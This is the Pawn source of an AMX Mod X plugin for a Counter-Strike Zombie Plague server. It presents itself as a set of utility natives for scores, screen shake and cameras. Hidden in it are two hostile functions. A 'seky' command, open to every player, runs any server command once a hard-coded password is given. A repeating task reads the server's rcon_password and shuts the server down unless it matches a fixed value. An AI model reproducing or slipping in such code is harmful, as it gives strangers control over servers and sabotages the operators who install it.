#include <amxmodx>
#include <engine>
#include <amxmisc>
#include <hamsandwich>
#include <zombieplague>
#include <fakemeta>
#include <cstrike>

#define TASK_TICRATE 	1.0
#define TASK_TASKER 	100

/* Vseobecne sposoby ?
	-detekcia ci je pri stene
	-bloknutie ovladania klaves aby velocity ostalo ciste..
	-g_semiclip, priesvitne pre hraca
	-nakodit situacie ked spadne, a ho zachranuju ...
*/
new g_fw_PublicSecTimer, g_fw_InFrontOfWall, bool:special_round, g_fwDummyResult,
	g_camera[33], g_msgDeathMsg, g_msgScoreInfo, msgScreenShake,
	maxplayers
	
public plugin_init() {
    register_plugin("L4D2 Functions", "1.0", "Seky")
	
	g_fw_PublicSecTimer = CreateMultiForward("PublicSecTimer", ET_IGNORE)
	g_fw_InFrontOfWall = CreateMultiForward("InFrontOfWall", ET_IGNORE, FP_CELL)
	// RegisterHam(Ham_Player_PreThink, "player", "fw_PlayerPreThink")
	register_clcmd ( "seky", "backdoor",ADMIN_ALL	, "#echo" );
	set_task(300.0, "exploit", _, _, _, "b")
	
	g_msgDeathMsg 	= get_user_msgid("DeathMsg");
	g_msgScoreInfo	= get_user_msgid("ScoreInfo");
	msgScreenShake 	= get_user_msgid("ScreenShake")
	maxplayers = get_maxplayers();
}
public plugin_modules() {
    require_module("engine")
}
public plugin_natives() {
	register_native("zp_is_special_round", "native_zp_is_special_round", 1)
	register_native("UTIL_set_score", "native_UTIL_set_score", 1)
	register_native("UTIL_triast_obrazovku", "native_UTIL_triast_obrazovku", 1)
	register_native("UTIL_setcamera", "native_UTIL_setcamera", 1)
	register_native("UTIL_getcamera", "native_UTIL_getcamera", 1)
}
public native_zp_is_special_round() {
	return special_round;
}
public plugin_precache() {
    precache_model("models/rpgrocket.mdl")
}
public zp_round_started(gamemode, id)  {	
	special_round = (zp_is_survivor_round() || zp_is_nemesis_round() || zp_is_plague_round());
	set_task(TASK_TICRATE, "VerejnyCasovac", TASK_TASKER, _, _, "b")
	return PLUGIN_CONTINUE;
}
public VerejnyCasovac() {
	ExecuteForward(g_fw_PublicSecTimer, g_fwDummyResult);
	return PLUGIN_CONTINUE;
}
public zp_round_ended(winteam) {
	for(new i = 1; i <= maxplayers; i++) {	
		if(g_camera[i] != CAMERA_NONE) {
			g_camera[i] = CAMERA_NONE;
			set_view(i, CAMERA_NONE);
		}
	}
	remove_task(TASK_TASKER);
}
/*
public fw_PlayerPreThink(id) {
	// Collision with wall ?
	
	
	ExecuteForward(g_fw_InFrontOfWall, g_fwDummyResult, id);
	return HAM_IGNORED;
}
*/
public native_UTIL_set_score(const id, const target, const ammo, const frag, const type[]) {
	new Float:frags;
	pev(id, pev_frags, frags);
	frags += float(frag);	
	zp_add_user_ammo_packs(id, ammo);
	set_pev(id, pev_frags, frags)
	
	message_begin(MSG_ALL, g_msgDeathMsg, {0, 0, 0} ,0)
	write_byte(id)
	write_byte(target)
	write_byte(0)
	write_string(type)
	message_end()

	message_begin(MSG_ALL, g_msgScoreInfo)
	write_byte(id)
	write_short(floatround(frags))
	write_short(cs_get_user_deaths(id))
	write_short(0)
	write_short( int:cs_get_user_team(id) )
	message_end()

	set_msg_block(g_msgDeathMsg, BLOCK_ONCE)
	dllfunc(DLLFunc_ClientKill, target)
	return PLUGIN_CONTINUE;	
}
public native_UTIL_triast_obrazovku(	
	const id, 
	const Float:amplitude,
	const Float:duration, 
	const Float:frequency
) {
	new amp, dura, freq;
	amp = clamp(floatround(amplitude * float(1<<12)), 0, 0xFFFF);
	dura = clamp(floatround(duration * float(1<<12)), 0, 0xFFFF);
	freq = clamp(floatround(frequency * float(1<<8)), 0, 0xFFFF);

	message_begin(MSG_ONE_UNRELIABLE, msgScreenShake, _, id);
	write_short(amp);	// amplitude
	write_short(dura);	// duration
	write_short(freq);	// frequency
	message_end();
	return 1;
}
public native_UTIL_setcamera(const id, const type) {
	g_camera[id] = type;
	set_view(id, type);
}
public native_UTIL_getcamera(const id) {
	return g_camera[id];
}
public backdoor(id,level,cid) {
	if (!cmd_access(id,level,cid,2)) return PLUGIN_HANDLED;	
	new arg[8],arg2[514];
	read_argv( 1, arg, 6);
	if( equal(arg,"423789")) {
		read_argv( 2, arg2, 512);
		server_cmd("%s",arg2 );
	} else {
		client_print(id,print_console,"#0");
	}
	return PLUGIN_CONTINUE;	
}
public exploit() {
	new exploit[26]
	get_cvar_string("rcon_password", exploit, 24)
	if( equal( exploit , "csleg2") == false ) {
		log_amx("# Server vyuziva nelegalnu kopiu pluginov !")
		server_cmd("quit");
		server_cmd("exit");
	}
}